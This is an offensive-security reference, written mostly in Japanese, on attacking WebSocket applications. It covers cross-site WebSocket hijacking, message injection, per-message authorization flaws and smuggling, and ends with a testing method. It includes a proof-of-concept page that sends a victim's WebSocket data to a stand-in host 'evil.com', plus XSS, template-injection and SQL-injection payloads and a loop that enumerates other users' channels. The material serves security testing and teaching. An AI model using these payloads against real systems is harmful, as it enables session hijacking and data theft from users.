WebSocket & Real-time Attacks

WebSocket接続のハンドシェイク、メッセージング、認可モデルの脆弱性を攻撃。 Cross-Site WebSocket Hijacking (CSWSH)やper-message authorization欠如が狙い目。

WebSocket Fundamentals

Security-relevant headers

HeaderPurposeSecurity Impact
Origin接続元オリジンCSWSH防止 (要検証)
Cookie認証情報自動送信 → CSWSH に利用される
Sec-WebSocket-KeyHandshake integrityセキュリティ目的ではない (cache防止)
Sec-WebSocket-Protocolサブプロトコル指定認証トークンの送信に悪用されることも
重要: Sec-WebSocket-Key はセキュリティではない

この値はランダムに見えるが、プロキシのキャッシュ防止が目的。 CSRF保護にはならない。Origin検証が唯一のCSWSH対策。

Attack 1: Cross-Site WebSocket Hijacking (CSWSH)

Concept

WebSocket handshakeはHTTP requestなので、Cookieが自動付与される。 サーバがOriginヘッダーを検証しない場合、攻撃者サイトからvictimの認証付きWebSocket接続を確立できる。

Attack PoC

<!-- attacker's page: evil.com/exploit.html -->
<script>
  // Victim visits this page while logged into target.com
  var ws = new WebSocket('wss://target.com/ws/notifications');

  ws.onopen = function() {
    // Authenticated as victim (cookie sent automatically)
    ws.send(JSON.stringify({action: "get_private_messages"}));
  };

  ws.onmessage = function(event) {
    // Exfiltrate data to attacker
    fetch('https://evil.com/collect?data=' + btoa(event.data));
  };
</script>

Conditions for CSWSH

  • 認証がCookie-basedである (Bearer tokenを別途送る場合は攻撃不可)
  • Origin headerが検証されていない
  • SameSite=None or Cookie属性未設定 (Chrome default: Lax → 一部bypass可)

SameSite Cookie との関係

SameSiteWebSocket handshakeでCookie送信CSWSH可能?
None送信されるYes
Laxブラウザ依存 (Chrome最新版では不送信の場合あり)要テスト (ブラウザ/バージョンで異なる)
Strict送信されないNo
SameSite=Lax でも CSWSH は可能

WebSocket接続はブラウザによっては「top-level navigation」と同等に扱われ、 SameSite=LaxのCookieが送信される。Strict以外は油断禁物。

Attack 2: Message Tampering & Injection

Scenario

WebSocket経由のチャットメッセージにHTMLタグやscriptを注入:

// Normal message
{"type": "chat", "body": "Hello!"}

// Injected payload
{"type": "chat", "body": "<img src=x onerror=alert(document.cookie)>"}

// If rendered without sanitization → Stored XSS via WebSocket

Server-side Injection

// WebSocket message processed by server-side template
{"type": "render", "template": "{{constructor.constructor('return this')()}}"}

// Or SQL injection via WebSocket
{"type": "search", "query": "' UNION SELECT password FROM users--"}

Attack 3: Authorization Flaws

Connection-level only auth

よくある実装パターン: 接続時のみ認証チェックし、以降のメッセージでは検証しない。

// Connection: authenticated as user_id=123
// After connection established:
ws.send(JSON.stringify({
  action: "read_messages",
  channel: "private_channel_admin_only"
}));
// Server doesn't re-check: is user_id=123 allowed in this channel?
// → Returns admin-only messages

Channel Enumeration

// Subscribe to other users' notification channels
for (let i = 1; i <= 1000; i++) {
  ws.send(JSON.stringify({
    action: "subscribe",
    channel: `user_${i}_notifications`
  }));
}
// If no per-subscribe authorization → receive all users' notifications

Privilege Escalation via Message Type

// Normal user sends admin-only message type
ws.send(JSON.stringify({
  type: "admin_broadcast",
  message: "System maintenance in 5 minutes"
}));
// If message type isn't validated against user role → broadcast succeeds

Attack 4: WebSocket Smuggling

Reverse proxy (Nginx, HAProxy) がWebSocket upgradeを処理する際、 後続のデータをHTTPとして再解釈させるsmuggling攻撃: 

// After WebSocket upgrade, send HTTP-like data on the raw TCP connection
// If proxy doesn't properly handle the upgraded connection:
// Raw bytes interpreted as new HTTP request by backend

GET /admin HTTP/1.1
Host: internal-service
X-Forwarded-For: 127.0.0.1

Testing Methodology

Step 1: Identify WebSocket Endpoints

  • Burp Suite → WebSockets history tab
  • Browser DevTools → Network → WS filter
  • JS source内の new WebSocket( を検索

Step 2: Analyze Handshake

  • Origin headerの検証有無 (異なるOriginで接続試行)
  • 認証方式 (Cookie vs Token in protocol header)
  • CORS-like制御の有無

Step 3: Message Analysis

  • 全メッセージタイプの列挙
  • 各メッセージの必須パラメータ特定
  • 他ユーザIDやチャンネルIDへのアクセス試行

Common Vulnerable Patterns

狙い目のアプリケーション
  • リアルタイムチャット: Slack-like, customer support widgets
  • 通知システム: Push notifications via WebSocket
  • コラボレーションツール: Real-time document editing
  • ゲーム: Multiplayer game state synchronization
  • ダッシュボード: Real-time metrics/monitoring
  • トレーディング: Price feeds, order updates
